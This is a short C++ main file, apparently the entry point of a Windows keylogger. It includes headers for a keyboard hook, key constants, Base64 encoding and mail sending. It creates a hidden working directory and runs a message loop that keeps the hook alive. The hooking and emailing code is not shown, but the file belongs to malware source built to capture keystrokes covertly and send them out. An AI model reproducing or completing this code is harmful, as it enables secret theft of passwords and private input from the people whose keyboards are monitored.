#include<iostream>
#include<Windows.h>
#include "Helper.h"
#include "KeyConstants.h"
#include "Base64.h"
#include "SendMail.h"
#include "KeybHook.h""



//using namespace std;

int main()
{
    MSG Msg;
    IO::MKDir(IO::GetOurPath(true));
    while(GetMessage(&Msg, NULL, 0, 0))
    {
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);

    }
    return 0;
}
